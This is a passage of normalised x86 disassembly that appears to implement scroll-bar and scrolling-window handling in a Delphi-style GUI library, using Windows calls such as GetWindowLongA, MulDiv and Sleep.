pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_44d7a4
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45e114
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_45e148
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45e114
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_45e114
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_45e1c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_45e148
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446988
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_45e148
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4469cc
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45e25c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_45e2bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_45e48d ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45e1c4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45e1c4
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
push ebp
call sub_45e25c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
push ebp
call sub_45e25c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406e8c
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45e62c
jmp r-xdata
sub_45e5b4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45eca4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_45e62c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_44d7a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_44d7a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_44d324
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_44d324
jmp r-xdata
call sub_45dd9c
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45e6f0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45eca4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_45e7a8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
call sub_4300c0
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
call sub_4300c0
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
call sub_4300c0
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_42697c
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
call sub_4300c0
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
call sub_4300c0
sub_45e8b0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45e1c4
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_45e1c4
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_45e7a8
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44d7a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_45e62c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_45e1c4
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45e9c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449498
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45de44
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45de44
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_45ea40
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403390
mov eax [ esi + 0x20c ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4495bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_45ea8c
push ebx
mov ebx eax
mov eax ebx
call sub_44a724
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_45eca4
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c4bc
test al al
jne r-xdata
mov eax ebx
call sub_44d7a4
push eax
call sub_4300f4
sub_45eacc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45ec24
mov ecx edi
mov edx esi
mov eax ebx
call sub_449e6c
pop edi
pop esi
pop ebx
retn
sub_45eb0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45ec14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_446988
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_45e0dc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_45e62c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a460
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a460
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41b4f8
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4466f4
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ec1b
mov eax [ ebp - 0x10 ]
call sub_403390
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45df24
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_41b654
xor ecx ecx
mov edx 0xb03e
call sub_448138
inc ebx
dec esi
jne r-xdata
sub_45ec48
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45e77c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45e77c
mov eax ebx
call sub_45ec24
jmp r-xdata
sub_45eca4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
xor eax eax
push ebp
push sub_45ed8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_45e244
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45e244
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_45e8b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_45e8b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_45e8b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45e8b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_45e8b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_45e8b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45edb4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_446a9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_446ac8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_446a9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_446ac8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_446988
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45e62c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_446988
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4469cc
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_45e62c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_446988
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_45e62c
mov eax ebx
call sub_446988
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4469cc
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4469cc
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_45e62c
mov eax ebx
call sub_4469cc
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45ef08
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_45e62c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_45e62c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45e77c
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_45e77c
sub_45efac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45ef08
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d278
pop edi
pop esi
pop ebx
retn
sub_45efd4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_45f03e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bd58
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f045
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_45f045
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_45f07d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45ec24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f084
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45f084
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45eca4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_45f0f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4469cc
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42e3c8
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_446988
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42e3c8
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_41a040
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4497d8
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45f168
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45f1c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40351c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44cae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f1d0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_45f1f8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f35c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_45f33c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4032d8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4036f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f343
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
